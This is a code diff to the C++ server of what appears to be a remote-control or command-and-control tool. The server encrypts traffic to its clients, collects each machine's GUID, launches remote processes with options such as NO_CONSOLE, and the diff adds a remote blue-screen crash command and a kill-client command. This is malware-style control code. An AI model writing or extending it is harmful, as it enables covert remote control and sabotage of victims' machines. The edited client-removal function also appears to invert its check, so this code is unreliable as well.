@@ -179,7 +179,7 @@ JSON ServerInterface::ReadServerStateFile() noexcept {
 
     if ( std::filesystem::is_empty(ReadConfig().serverStateFullPath) )
         return parsed;
-
+    
     input >> parsed;
     return parsed;
 }
@@ -411,8 +411,6 @@ void ServerInterface::SendKeepAlivePackets(long cuid) {
     do {
         client->KeepAliveSuccess = FALSE;
 
-        std::cout << "Sending keep-alive packet to " << cuid << "..." << std::endl;
-
         BYTESTRING encryptedOriginal = LGCrypto::RSAEncrypt(Serialization::SerializeStruct(CreateKeepAlivePacket()), client->ClientPublicKey, FALSE);
 
         m_NetworkManager.SetSocketTimeout(client->GetSocket(), ReadConfig().keepAliveTimeoutMs, SO_SNDTIMEO);
@@ -584,7 +582,7 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         std::cout << "Arguments for " << kOpenRemoteProcess << ": ";
         std::getline(std::cin, input);
         
-        std::cout << "Input name of flags, separated by a semi-colon [e.g 'NO_CONSOLE;USE_CLI']: ";
+        std::cout << "Input name of flags: ";
         std::string flagInput;
         std::getline(std::cin, flagInput);
         
@@ -597,6 +595,10 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         performed = true;
         break;        
     }
+    case RemoteAction::kKillClient:
+        break;
+    // no additional user input required 
+    case RemoteAction::kRemoteBSOD:
     case RemoteAction::kPingClient:
         performed = true;
         break;
@@ -616,8 +618,12 @@ void ServerInterface::SendCommandsToClients() {
 }
 
 void ServerInterface::RemoveClientFromServer(Client* client) {
-    if ( !client )
+    if ( !client || ClientIsInClientList(client->ClientUID) )
         return;
+    
+    this->m_ClientListMutex.lock();
+    this->m_ClientList.erase(client->ClientUID);
+    this->m_ClientListMutex.unlock();
 
     client->Disconnect();
 }
@@ -642,7 +648,7 @@ void ServerInterface::RunUserInputOnClients() {
         // select which client to run command on
         std::string  clientID;    
         long         lClientID     = 0;
-        Client*         client        = nullptr;
+        Client*      client        = nullptr;
         BOOL         performed     = FALSE;
         BOOL         globalCommand = FALSE; // perform command on all clients
         std::string  command;
@@ -755,6 +761,7 @@ bool ServerInterface::GetClientMachineGUID(long cuid) {
         return false;
 
     std::string machineGuid = Serialization::BytestringToString(decrypted);
+    std::cout << machineGuid << std::endl;
     client->SetMachineGUID(machineGuid);
     return true;
 }
